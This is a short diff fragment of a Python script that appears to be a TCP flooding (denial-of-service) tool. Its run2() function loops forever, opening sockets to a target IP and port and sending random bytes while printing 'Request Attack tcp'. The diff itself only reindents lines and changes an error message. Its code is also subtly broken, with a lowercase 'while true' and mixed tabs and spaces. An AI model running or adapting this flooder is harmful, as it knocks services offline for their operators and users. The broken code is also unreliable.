@@ -78,21 +78,20 @@ def run():
 		except:
 			print(["- \033[97mError!!!]\033[0m")
 
-
 def run2():
 	data = random._urandom(999)
 	i = random.choice(("[+]"))
 	while true:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
+		        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		        s.connect((ip,port))
+		        s.send(data)
+		        for x in range(times):
 				s.send(data)
                         print(i + "\033[32mRequest Attack tcp::..\033[0m")
 		except:
-			s.close()
-			print("- [\033[31mError!!!]\033[0m")
+		        s.close()
+		        print("[-] \033[31mError!!!\033[0m")
             
 
 def run3():
